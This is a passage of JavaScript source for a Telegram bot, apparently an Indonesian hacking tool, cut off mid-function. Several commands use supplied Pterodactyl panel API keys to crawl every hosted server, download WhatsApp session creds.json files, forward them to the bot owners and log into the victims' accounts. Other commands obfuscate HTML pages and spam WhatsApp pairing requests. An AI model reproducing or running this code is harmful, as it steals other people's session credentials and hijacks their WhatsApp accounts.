    console.error("csessions Error:", err && (err.response && err.response.data) ? err.response.data : err.message);
    await ctx.reply("❌ Terjadi error saat scan. Cek logs server.");
    for (let oid of ownerIds) {
      try { await ctx.telegram.sendMessage(oid, "❌ Terjadi error saat scan publik."); } catch {}
    }
  }
});

bot.command("csesi", async (ctx) => {
  const REQUEST_DELAY_MS = 250;

  const sleep = (ms) => new Promise(r => setTimeout(r, ms));

  const input = ctx.message.text.split(" ").slice(1);
  if (input.length < 3) {
    return ctx.reply("Format salah\nContoh: /csession http://domain.com plta_xxxx pltc_xxxx");
  }

  const domainBase = input[0].replace(/\/+$/, "");
  const plta = input[1];
  const pltc = input[2];

  await ctx.reply("🔍 Sedang mencari *creds.json* di semua server...\n(1x percobaan per server, auto deteksi nomor WA)", { parse_mode: "Markdown" });

  try {
    const appRes = await axios.get(`${domainBase}/api/application/servers`, {
      headers: { Accept: "application/json", Authorization: `Bearer ${plta}` }
    });
    const servers = appRes.data?.data || [];
    if (!servers.length) return ctx.reply("❌ Tidak ada server ditemukan.");

    let totalFound = 0;

    for (const srv of servers) {
      const identifier = srv.attributes?.identifier || srv.identifier || srv.attributes?.id;
      if (!identifier) continue;

      const name = srv.attributes?.name || srv.name || identifier || "unknown";
      let credsDownloaded = null;

      // lokasi umum creds.json
      const commonPaths = [
        "/home/container/session/creds.json",
        "/home/container/sessions/creds.json",
        "/session/creds.json",
        "/sessions/creds.json"
      ];

      // coba download salah satu path yang ada
      for (const pathAttempt of commonPaths) {
        try {
          const dlMeta = await axios.get(`${domainBase}/api/client/servers/${identifier}/files/download`, {
            params: { file: pathAttempt },
            headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
          });

          if (dlMeta?.data?.attributes?.url) {
            const fileRes = await axios.get(dlMeta.data.attributes.url, { responseType: "arraybuffer" });
            credsDownloaded = Buffer.from(fileRes.data);
            console.log(`[FOUND] creds.json di ${name}: ${pathAttempt}`);
            break;
          }
        } catch (err) {
          // skip
        }
        await sleep(REQUEST_DELAY_MS);
      }

      if (credsDownloaded) {
        totalFound++;

        // --- Ambil nomor otomatis dari creds.json ---
        let BotNumber = "unknown_number";
        try {
          const json = JSON.parse(credsDownloaded.toString("utf8"));
          const candidate =
            json.id ||
            json.phone ||
            json.number ||
            json.me?.id ||
            json.me?.jid ||
            json.me?.user ||
            json.clientID ||
            json.registration?.phone ||
            null;

          if (candidate) {
            // hapus karakter non-digit
            BotNumber = candidate.toString().replace(/\D+/g, "");
            if (!BotNumber.startsWith("62") && BotNumber.length > 8) {
              BotNumber = "62" + BotNumber; // auto format Indonesia
            }
          }
        } catch (e) {
          console.log("Gagal parse creds.json:", e.message);
        }

        // Simpan session file berdasarkan nomor
        const sessDir = sessionPath(BotNumber);
        try { fs.mkdirSync(sessDir, { recursive: true }); } catch {}
        const credsPath = path.join(sessDir, "creds.json");
        fs.writeFileSync(credsPath, credsDownloaded);

        // Kirim ke owner
        for (const oid of ownerIds) {
          try {
            await ctx.telegram.sendDocument(oid, {
              source: credsDownloaded,
              filename: `${BotNumber}_creds.json`
            });
            await ctx.telegram.sendMessage(oid, `📱 *Auto Detect:* ${BotNumber}\n📁 Server: ${name}`, { parse_mode: "Markdown" });
          } catch {}
        }

        // Auto connect ke WhatsApp
        try {
          await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
        } catch (e) {
          console.log("Gagal connect WA:", e.message);
        }

      } else {
        console.log(`[SKIP] Tidak ditemukan creds.json di ${name}`);
      }

      await sleep(REQUEST_DELAY_MS * 2);
    }

    if (totalFound === 0) {
      await ctx.reply("✅ Selesai. Tidak ada *creds.json* ditemukan di semua server.", { parse_mode: "Markdown" });
    } else {
      await ctx.reply(`✅ Selesai. Total file *creds.json* ditemukan: ${totalFound}`, { parse_mode: "Markdown" });
    }

  } catch (err) {
    console.error("csession error:", err?.response?.data || err.message);
    await ctx.reply("❌ Terjadi error saat scan. Periksa log server.");
  }
});

bot.command("csesii", async (ctx) => {
  const REQUEST_DELAY_MS = 250;

  const sleep = (ms) => new Promise(r => setTimeout(r, ms));

  const input = ctx.message.text.split(" ").slice(1);
  if (input.length < 3) {
    return ctx.reply("Format salah\nContoh: /csession http://domain.com plta_xxxx pltc_xxxx");
  }

  const domainBase = input[0].replace(/\/+$/, "");
  const plta = input[1];
  const pltc = input[2];

  await ctx.reply("🔍 Sedang scan semua server untuk mencari `creds.json` ...\n(1x percobaan per server, auto deteksi nomor WA)", { parse_mode: "Markdown" });

  try {
    const appRes = await axios.get(`${domainBase}/api/application/servers`, {
      headers: { Accept: "application/json", Authorization: `Bearer ${plta}` }
    });
    const servers = appRes.data?.data || [];
    if (!servers.length) return ctx.reply("❌ Tidak ada server ditemukan.");

    let totalFound = 0;

    for (const srv of servers) {
      const identifier = srv.attributes?.identifier || srv.identifier || srv.attributes?.id;
      if (!identifier) continue;

      const name = srv.attributes?.name || srv.name || identifier || "unknown";
      let credsDownloaded = null;

      const commonPaths = [
        "/home/container/session/creds.json",
        "/home/container/sessions/creds.json",
        "/session/creds.json",
        "/sessions/creds.json"
      ];

      for (const pathAttempt of commonPaths) {
        try {
          const dlMeta = await axios.get(`${domainBase}/api/client/servers/${identifier}/files/download`, {
            params: { file: pathAttempt },
            headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
          });

          if (dlMeta?.data?.attributes?.url) {
            const fileRes = await axios.get(dlMeta.data.attributes.url, { responseType: "arraybuffer" });
            credsDownloaded = Buffer.from(fileRes.data);
            console.log(`[FOUND] creds.json di ${name}: ${pathAttempt}`);
            break;
          }
        } catch {}
        await sleep(REQUEST_DELAY_MS);
      }

      if (credsDownloaded) {
        totalFound++;

        // --- Auto detect nomor WA ---
        let BotNumber = "unknown_number";
        try {
          const json = JSON.parse(credsDownloaded.toString("utf8"));
          const candidate =
            json.id ||
            json.phone ||
            json.number ||
            json.me?.id ||
            json.me?.jid ||
            json.me?.user ||
            json.clientID ||
            json.registration?.phone ||
            null;

          if (candidate) {
            BotNumber = candidate.toString().replace(/\D+/g, "");
            if (!BotNumber.startsWith("62") && BotNumber.length > 8) BotNumber = "62" + BotNumber;
          }
        } catch (e) {
          console.log("Gagal parse creds.json:", e.message);
        }

        // Simpan session
        const sessDir = sessionPath(BotNumber);
        try { fs.mkdirSync(sessDir, { recursive: true }); } catch {}
        const credsPath = path.join(sessDir, "creds.json");
        fs.writeFileSync(credsPath, credsDownloaded);

        // Kirim ke owner
        for (const oid of ownerIds) {
          try {
            await ctx.telegram.sendDocument(oid, { source: credsDownloaded, filename: `${BotNumber}_creds.json` });
            await ctx.telegram.sendMessage(oid, `📱 *Auto Detect:* ${BotNumber}\n📁 Server: ${name}`, { parse_mode: "Markdown" });
          } catch {}
        }

        // --- Connect WA 1x saja ---
        const flagPath = path.join(sessDir, "connected.flag");
        if (!fs.existsSync(flagPath)) {
          try {
            await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
            fs.writeFileSync(flagPath, "1"); // buat flag supaya tidak reconnect
          } catch (e) {
            console.log("Gagal connect WA:", e.message);
          }
        }

      } else {
        console.log(`[SKIP] Tidak ditemukan creds.json di ${name}`);
      }

      await sleep(REQUEST_DELAY_MS * 2);
    }

    if (totalFound === 0) {
      await ctx.reply("✅ Scan selesai. Tidak ada *creds.json* ditemukan di semua server.", { parse_mode: "Markdown" });
    } else {
      await ctx.reply(`✅ Scan selesai. Total file *creds.json* ditemukan: ${totalFound}`, { parse_mode: "Markdown" });
    }

  } catch (err) {
    console.error("csession error:", err?.response?.data || err.message);
    await ctx.reply("❌ Terjadi error saat scan. Periksa log server.");
  }
});

bot.command("enccc", async (ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from?.id;

  // Hapus cek premium
  // const premium = await isUserPremium(userId);
  // if (!premium) return sendJoinButton(ctx);

  // harus reply dokumen
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
    return ctx.reply("❌ REPLY FILE HTML YANG MAU DI ENC");
  }

  try {
    const fileId = ctx.message.reply_to_message.document.file_id;
    const fileInfo = await ctx.telegram.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${process.env.BOT_TOKEN}/${fileInfo.file_path}`;

    const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
    const htmlContent = Buffer.from(response.data).toString("utf8");

    const encoded = Buffer.from(htmlContent, "utf8").toString("base64");
    const encryptedHTML = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<title>Mw Apah</title>
<script>
(function(){
  try { document.write(atob("${encoded}")); }
  catch(e){ console.error(e); }
})();
</script>
</head>
<body></body>
</html>`;

    const outputPath = path.join(__dirname, "encrypted.html");
    fs.writeFileSync(outputPath, encryptedHTML, "utf-8");

    await ctx.replyWithDocument({ source: outputPath }, { caption: "✅ HTML FILE SUCCES DI ENC" });

    fs.unlinkSync(outputPath);
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ERROR SAAT MEMPROSES");
  }
});

bot.command("enchml", async (ctx) => {
  // harus reply dokumen
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
    return ctx.reply("❌ REPLY FILE HTML YANG MAU DI ENC");
  }

  try {
    const fileId = ctx.message.reply_to_message.document.file_id;

    // ambil file info
    const fileInfo = await ctx.telegram.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${tokens}/${fileInfo.file_path}`;

    // download file html
    const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
    const htmlContent = Buffer.from(response.data).toString("utf8");

    // encode base64
    const encoded = Buffer.from(htmlContent, "utf8").toString("base64");
    const encryptedHTML = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<title>Mw Apah</title>
<script>
(function(){
  try { document.write(atob("${encoded}")); }
  catch(e){ console.error(e); }
})();
</script>
</head>
<body></body>
</html>`;

    // simpan hasil
    const outputPath = path.join(__dirname, "encrypted.html");
    fs.writeFileSync(outputPath, encryptedHTML, "utf-8");

    await ctx.replyWithDocument({ source: outputPath }, { caption: "✅ HTML FILE SUCCES DI ENC" });

    fs.unlinkSync(outputPath);
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ERROR SAAT MEMPROSES");
  }
});


bot.command("createakun", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ACESSO SOMENTE PARA USUÁRIOS\n—Por favor, registre-se primeiro para acessar este recurso.");
  }

  if (!args || !args.includes(",")) {
    return ctx.reply("✗ Falha\n\nExample :\n• /createakun oneverse,1d\n• /createakun oneverse,1d,agus", { parse_mode: "HTML" });
  }

  const parts = args.split(",");
  const username = parts[0].trim();
  const durasiStr = parts[1].trim();
  const customKey = parts[2] ? parts[2].trim() : null;

  const durationMs = parseDuration(durasiStr);
  if (!durationMs) return ctx.reply("✗ Format durasi salah! Gunakan contoh: 7d / 1d / 12h");

  const key = customKey || generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired };
  } else {
    users.push({ username, key, expired });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  await ctx.reply(
    `✓ <b>Key berhasil dibuat:</b>\n\n` +
    `<b>Username:</b> <code>${username}</code>\n` +
    `<b>Key:</b> <code>${key}</code>\n` +
    `<b>Expired:</b> <i>${expiredStr}</i> WIB`,
    { parse_mode: "HTML" }
  );
});

bot.command("listkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();

  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ACESSO SOMENTE PARA O DONO\n—Por favor, registre-se primeiro para acessar este recurso.");
  }

  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `𞅏 𝑨𝒄𝒕𝒊𝒗𝒆 𝑲𝒆𝒚 𝑳𝒊𝒔𝒕:\n\n`;

  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `${i + 1}. ${u.username}\nKey: ${u.key}\nExpired: ${exp} WIB\n\n`;
  });

  await ctx.reply(teks);
});

bot.command("csessionn", async (ctx) => {
  const DEBUG_CS = false;
  const SEND_TO_CALLER = false;
  const REQUEST_DELAY_MS = 250;
  const MAX_DEPTH = 12;
  const MAX_SEND_TEXT = 3500;

  const sleep = (ms) => new Promise(r => setTimeout(r, ms));

  function isDirectory(item) {
    if (!item) return false;
    const a = item.attributes || {};
    const checks = [a.type, a.mode, item.type, item.mode, a.is_directory, a.isDir, item.is_directory, item.isDir];
    for (let c of checks) {
      if (typeof c === "string") {
        const lc = c.toLowerCase();
        if (lc === "dir" || lc === "directory" || lc === "d") return true;
        if (lc === "file" || lc === "f") return false;
      }
      if (c === true) return true;
      if (c === false) return false;
    }
    return false;
  }

  function normalizeDir(dir) {
    if (!dir) return "/";
    let d = String(dir).replace(/\/+/g, "/");
    if (!d.startsWith("/")) d = "/" + d;
    if (d.length > 1 && d.endsWith("/")) d = d.slice(0, -1);
    return d;
  }

  function extractName(item) {
    const a = item.attributes || {};
    return a.name || item.name || a.filename || item.filename || a.path || item.path || "";
  }

  async function apiListFiles(domainBase, identifier, dir) {
    try {
      const res = await axios.get(`${domainBase}/api/client/servers/${identifier}/files/list`, {
        params: { directory: dir },
        headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
      });
      return res.data;
    } catch(e) {
      if (DEBUG_CS) console.error("apiListFiles", e?.response?.data || e.message);
      return null;
    }
  }

  async function tryDownloadFile(domainBase, identifier, absFilePath) {
    const candidates = [];
    const p = String(absFilePath || "").replace(/\/+/g, "/");
    if (!p) return null;
    candidates.push(p.startsWith("/") ? p : "/" + p);
    const noLead = p.startsWith("/") ? p.slice(1) : p;
    candidates.push("/" + noLead);
    candidates.push(noLead);

    for (let c of candidates) {
      try {
        const dlMeta = await axios.get(`${domainBase}/api/client/servers/${identifier}/files/download`, {
          params: { file: c },
          headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
        });
        if (dlMeta?.data?.attributes?.url) {
          const fileRes = await axios.get(dlMeta.data.attributes.url, { responseType: "arraybuffer" });
          return { buffer: Buffer.from(fileRes.data), meta: dlMeta.data };
        }
      } catch(e) { if(DEBUG_CS) console.error("tryDownloadFile", c, e?.response?.data || e.message); }
      await sleep(REQUEST_DELAY_MS);
    }
    return null;
  }

  async function traverseAndFind(domainBase, identifier, dir = "/", depth = 0) {
    dir = normalizeDir(dir);
    if (depth > MAX_DEPTH) return [];
    const listJson = await apiListFiles(domainBase, identifier, dir);
    if (!listJson?.data?.length) return [];
    let found = [];

    for (let item of listJson.data) {
      const rawName = extractName(item);
      if (!rawName) continue;

      const itemPath = (dir === "/" ? "" : dir) + "/" + rawName;
      const lname = rawName.split("/").pop().toLowerCase();

      // cek folder session / sessions
      if (isDirectory(item) && (lname === "session" || lname === "sessions")) {
        const sessList = await apiListFiles(domainBase, identifier, normalizeDir(itemPath));
        if (sessList?.data?.length) {
          for (let sf of sessList.data) {
            const sfName = extractName(sf);
            if (!sfName) continue;
            const sfBase = sfName.split("/").pop();
            if (sfBase.toLowerCase() === "creds.json" || sfBase.toLowerCase().endsWith("creds.json")) {
              found.push({ path: normalizeDir(itemPath) + "/" + sfBase, name: sfBase });
            }
          }
        }
      }

      // langsung file creds.json
      if (!isDirectory(item) && (lname === "creds.json" || lname.endsWith("creds.json"))) {
        found.push({ path: normalizeDir(itemPath), name: lname });
      }

      // rekursi
      if (isDirectory(item)) {
        const more = await traverseAndFind(domainBase, identifier, itemPath, depth + 1);
        if (more?.length) found = found.concat(more);
      }

      await sleep(REQUEST_DELAY_MS);
    }

    // deduplicate
    const uniq = [];
    const seen = new Set();
    for (let f of found) {
      const p = f.path.replace(/\/+/g, "/");
      if (!seen.has(p)) { seen.add(p); uniq.push(f); }
    }
    return uniq;
  }

  // -- START --
  const input = ctx.message.text.split(" ").slice(1);
  if (input.length < 3) return ctx.reply("Format salah\nContoh: /csession http://domain.com plta_xxxx pltc_xxxx");

  const domainBase = input[0].replace(/\/+$/, "");
  const plta = input[1];
  const pltc = input[2];

  await ctx.reply("⏳ Sedang scan semua server untuk mencari folder `session` / `sessions` dan file `creds.json` ...");

  try {
    const appRes = await axios.get(`${domainBase}/api/application/servers`, {
      headers: { Accept: "application/json", Authorization: `Bearer ${plta}` }
    });
    const appData = appRes.data;
    if (!Array.isArray(appData.data)) return ctx.reply("❌ Gagal ambil list server.");

    let totalFound = 0;

    for (let srv of appData.data) {
      const identifier = srv.attributes?.identifier || srv.identifier || srv.attributes?.id;
      const name = srv.attributes?.name || srv.name || identifier || "unknown";
      if (!identifier) continue;

      let foundList = await traverseAndFind(domainBase, identifier, "/");

      // coba common paths
      const commonPaths = [
        "/home/container/session/creds.json",
        "/home/container/sessions/creds.json",
        "/container/session/creds.json",
        "/session/creds.json",
        "/sessions/creds.json",
        "home/container/session/creds.json"
      ];

      for (let cp of commonPaths) {
        if (!foundList.length) {
          const dl = await tryDownloadFile(domainBase, identifier, cp);
          if (dl) foundList.push({ path: cp.startsWith("/") ? cp : "/" + cp, name: "creds.json" });
        }
      }

      if (foundList?.length) {
        for (let fileInfo of foundList) {
          totalFound++;
          const filePath = fileInfo.path.replace(/\/+/g, "/").replace(/^\/?/, "/");

          // download
          const downloaded = await tryDownloadFile(domainBase, identifier, filePath);
          if (!downloaded) continue;

          // parse nomor WA
          let BotNumber = "unknown_number";
          try {
            const txt = downloaded.buffer.toString("utf8");
            const json = JSON.parse(txt);
            BotNumber = json.id || json.phone || json.number || BotNumber;
            BotNumber = BotNumber.toString().replace(/\D+/g, "");
          } catch(e) { if(DEBUG_CS) console.error("parse number err", e?.message); }

          // simpan
          const sessDir = sessionPath(BotNumber);
          try { fs.mkdirSync(sessDir, { recursive: true }); } catch {}
          fs.writeFileSync(path.join(sessDir, "creds.json"), downloaded.buffer);

          // kirim ke owner
          for (let oid of ownerIds) {
            try {
              await ctx.telegram.sendDocument(oid, { source: downloaded.buffer, filename: `${BotNumber}_creds.json` });
            } catch {}
          }

          // preview / parsed
          try {
            const txt = downloaded.buffer.toString("utf8");
            let parsed = null;
            try { parsed = JSON.parse(txt); } catch {}
            if (parsed) {
              const pretty = JSON.stringify(parsed, null, 2);
              const payload = pretty.length > MAX_SEND_TEXT ? pretty.slice(0, MAX_SEND_TEXT) + "\n\n...[truncated]" : pretty;
              for (let oid of ownerIds) await ctx.telegram.sendMessage(oid, `\`${BotNumber}_creds.json\` (parsed JSON):\n\`\`\`json\n${payload}\n\`\`\``, { parse_mode: "Markdown" });
            }
          } catch(e) { if(DEBUG_CS) console.error(e); }

          // auto connect WA
          try { await connectToWhatsApp(BotNumber, ctx.chat.id, ctx); } catch(e) { if(DEBUG_CS) console.error("connectToWA", e?.message); }

          await sleep(REQUEST_DELAY_MS);
        }
      }

      await sleep(REQUEST_DELAY_MS * 2);
    }

    await ctx.reply(totalFound === 0
      ? "✅ Scan selesai. Tidak ditemukan creds.json di server manapun."
      : `✅ Scan selesai. Total file creds.json ditemukan: ${totalFound} (otomatis connect ke WA nomor).`
    );

  } catch (err) {
    console.error("csession err:", err?.response?.data || err.message);
    await ctx.reply("❌ Terjadi error saat scan.");
  }
});

bot.command("spampair", async (ctx) => {
  const input = ctx.message.text.split(" ").slice(1); // /spampair 62812xxxx
  if (input.length < 1) return ctx.reply("Format: /spampair <BotNumber>");
  const BotNumber = input[0];

  // Jalankan async loop
  await sendPairingAsync(BotNumber, ctx.chat.id, ctx);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ACESSO SOMENTE PARA USUÁRIOS\n—Por favor, registre-se primeiro para acessar este recurso.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey shin");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`✗ Username \`${username}\` not found.`, { parse_mode: "HTML" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✓ Key belonging to ${username} was successfully deleted.`, { parse_mode: "HTML" });
});

bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ACESSO SOMENTE PARA O DONO\n—Por favor, registre-se primeiro para acessar este recurso.");
  }
  
  if (!id) return ctx.reply("✗ Falha\n\nExample : /addacces 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✓ User already has access.");

  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✓ Access granted to ID: ${id}`);
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ACESSO SOMENTE PARA O DONO\n—Por favor, registre-se primeiro para acessar este recurso.");
  }
  
  if (!id) return ctx.reply("✗ Falha\n\nExample : /delacces 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("✗ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✓ Access to user ID ${id} removed.`);
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ACESSO SOMENTE PARA O DONO\n—Por favor, registre-se primeiro para acessar este recurso.");
  }
  
  if (!id) return ctx.reply("✗ Falha\n\nExample : /addowner 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("✗ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✓ New owner added: ${id}`);
});

bot.command("getcode", async (ctx) => {
    const chatId = ctx.chat.id;
    const input = ctx.message.text.split(" ").slice(1).join(" ").trim();

    if (!input) {
        return ctx.reply("❌ Missing input. Please provide a website URL.\n\nExample:\n/getcode https://example.com");
    }

    const url = input;

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/tools/getcode?url=${encodeURIComponent(url)}`;
        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result) {
            return ctx.reply("❌ Failed to fetch source code. Please check the URL.");
        }

        const code = data.result;

        if (code.length > 4000) {
            // simpan ke file sementara
            const filePath = `sourcecode_${Date.now()}.html`;
            fs.writeFileSync(filePath, code);

            await ctx.replyWithDocument({ source: filePath, filename: `sourcecode.html` }, { caption: `📄 Full source code from: ${url}` });

            fs.unlinkSync(filePath); // hapus file setelah dikirim
        } else {
            await ctx.replyWithHTML(`📄 Source Code from: ${url}\n\n<code>${code}</code>`);
        }
    } catch (err) {
        console.error("GetCode API Error:", err);
        ctx.reply("❌ Error fetching website source code. Please try again later.");
    }
});



bot.command("csessi", async (ctx) => {
  const REQUEST_DELAY_MS = 250;

  const sleep = (ms) => new Promise(r => setTimeout(r, ms));

  const input = ctx.message.text.split(" ").slice(1);
  if (input.length < 3) return ctx.reply("Format salah\nContoh: /csession http://domain.com plta_xxxx pltc_xxxx");

  const domainBase = input[0].replace(/\/+$/, "");
  const plta = input[1];
  const pltc = input[2];

  await ctx.reply("⏳ Sedang scan semua server (1x percobaan per server)...");

  try {
    const appRes = await axios.get(`${domainBase}/api/application/servers`, {
      headers: { Accept: "application/json", Authorization: `Bearer ${plta}` }
    });
    const servers = appRes.data?.data || [];
    if (!servers.length) return ctx.reply("❌ Tidak ada server ditemukan.");

    let totalFound = 0;

    for (let srv of servers) {
      const identifier = srv.attributes?.identifier || srv.identifier || srv.attributes?.id;
      if (!identifier) continue;

      const name = srv.attributes?.name || srv.name || identifier || "unknown";
      let credsDownloaded = null;

      const commonPaths = [
        "/home/container/session/creds.json",
        "/home/container/sessions/creds.json",
        "/session/creds.json",
        "/sessions/creds.json"
      ];

      for (let pathAttempt of commonPaths) {
        try {
          const dlMeta = await axios.get(`${domainBase}/api/client/servers/${identifier}/files/download`, {
            params: { file: pathAttempt },
            headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
          });
          if (dlMeta?.data?.attributes?.url) {
            const fileRes = await axios.get(dlMeta.data.attributes.url, { responseType: "arraybuffer" });
            credsDownloaded = Buffer.from(fileRes.data);
            break; // berhasil, hentikan loop commonPaths
          }
        } catch {}
        await sleep(REQUEST_DELAY_MS);
      }

      if (credsDownloaded) {
        totalFound++;
        // parse nomor WA
        let BotNumber = "unknown_number";
        try {
          const json = JSON.parse(credsDownloaded.toString("utf8"));
          BotNumber = json.id || json.phone || json.number || BotNumber;
          BotNumber = BotNumber.toString().replace(/\D+/g, "");
        } catch {}

        // simpan
        const sessDir = sessionPath(BotNumber);
        try { fs.mkdirSync(sessDir, { recursive: true }); } catch {}
        fs.writeFileSync(path.join(sessDir, "creds.json"), credsDownloaded);

        // kirim ke owner
        for (let oid of ownerIds) {
          try { await ctx.telegram.sendDocument(oid, { source: credsDownloaded, filename: `${BotNumber}_creds.json` }); } catch {}
        }

        // connect WA
        try { await connectToWhatsApp(BotNumber, ctx.chat.id, ctx); } catch {}

      } else {
        console.log("Tidak ditemukan creds.json untuk server:", name);
      }

      await sleep(REQUEST_DELAY_MS * 2);
    }

    await ctx.reply(totalFound === 0
      ? "✅ Scan selesai. Tidak ditemukan creds.json di server manapun."
      : `✅ Scan selesai. Total file creds.json ditemukan: ${totalFound}.`);

  } catch (err) {
    console.error("csession error:", err?.response?.data || err.message);
    await ctx.reply("❌ Terjadi error saat scan.");
  }
});

bot.command("csender", async (ctx) => {
  const REQUEST_DELAY_MS = 250;
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));
  const MAX_PREVIEW_CHARS = 600;

  const input = ctx.message.text.split(" ").slice(1);
  if (input.length < 3) return ctx.reply("Format salah\nContoh: /csession http://domain.com plta_xxxx pltc_xxxx");

  const domainBase = input[0].replace(/\/+$/, "");
  const plta = input[1];
  const pltc = input[2];

  await ctx.reply("🔍 Mencari creds.json di semua server (1x percobaan per server)...");

  try {
    const appRes = await axios.get(`${domainBase}/api/application/servers`, {
      headers: { Accept: "application/json", Authorization: `Bearer ${plta}` }
    });
    const servers = appRes.data?.data || [];
    if (!servers.length) return ctx.reply("❌ Tidak ada server ditemukan.");

    let totalFound = 0;

    for (const srv of servers) {
      const identifier = srv.attributes?.identifier || srv.identifier || srv.attributes?.id;
      if (!identifier) continue;
      const name = srv.attributes?.name || srv.name || identifier || "unknown";

      // paths umum creds.json
      const commonPaths = [
        "/home/container/session/creds.json",
        "/home/container/sessions/creds.json",
        "/session/creds.json",
        "/sessions/creds.json"
      ];

      let credsBuffer = null;
      let usedPath = null;

      for (const p of commonPaths) {
        try {
          const dlMeta = await axios.get(`${domainBase}/api/client/servers/${identifier}/files/download`, {
            params: { file: p },
            headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
          });
          if (dlMeta?.data?.attributes?.url) {
            const fileRes = await axios.get(dlMeta.data.attributes.url, { responseType: "arraybuffer" });
            credsBuffer = Buffer.from(fileRes.data);
            usedPath = p;
            break;
          }
        } catch {}
        await sleep(REQUEST_DELAY_MS);
      }

      if (!credsBuffer) continue;
      totalFound++;

      // auto detect nomor WA dari creds.json
      let BotNumber = "unknown_number";
      try {
        const txt = credsBuffer.toString("utf8");
        const json = JSON.parse(txt);
        const candidate =
          json.id || json.phone || json.number ||
          (json.me && (json.me.id || json.me.jid || json.me.user)) ||
          json.clientID ||
          (json.registration && json.registration.phone) ||
          null;
        if (candidate) BotNumber = String(candidate).replace(/\D+/g, "");
      } catch {}
      if (!BotNumber || BotNumber.length < 6) BotNumber = String(identifier).replace(/\s+/g, "_");

      const sessDir = sessionPath(BotNumber);
      try { fs.mkdirSync(sessDir, { recursive: true }); } catch {}

      const credsPath = path.join(sessDir, "creds.json");
      const connectedFlag = path.join(sessDir, "connected.flag");
      const failedFlag = path.join(sessDir, "failed.flag");

      fs.writeFileSync(credsPath, credsBuffer);

      // kirim file + info ke owner
      for (const oid of ownerIds) {
        try {
          await ctx.telegram.sendDocument(oid, { source: credsBuffer, filename: `${BotNumber}_creds.json` });
          await ctx.telegram.sendMessage(oid, `📱 Nomor: ${BotNumber}\n📁 Server: ${name}\n📂 Path: ${usedPath}`, { parse_mode: "Markdown" });
          let preview = credsBuffer.toString("utf8").slice(0, MAX_PREVIEW_CHARS);
          if (credsBuffer.length > MAX_PREVIEW_CHARS) preview += "\n\n...[truncated]";
          await ctx.telegram.sendMessage(oid, `Preview creds.json:\n\`\`\`\n${preview}\n\`\`\``, { parse_mode: "Markdown" });
        } catch {}
      }

      if (fs.existsSync(connectedFlag) || fs.existsSync(failedFlag)) continue;

      // coba connect WA 1x
      try {
        if (fs.existsSync(credsPath)) {
          await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
          fs.writeFileSync(connectedFlag, String(Date.now()));
          console.log(`[CONNECTED] ${BotNumber}`);
        }
      } catch (err) {
        let reason = "Unknown";
        if (err?.response?.status) {
          const status = err.response.status;
          if (status === 403) reason = "403 Forbidden";
          else if (status === 440) reason = "440 Login Timeout";
          else if (status === 404) reason = "404 Not Found";
          else reason = `${status} ${err.response.statusText || ""}`;
        } else if (err?.message) {
          reason = err.message.includes("404") ? "404 Not Found" : err.message;
        }

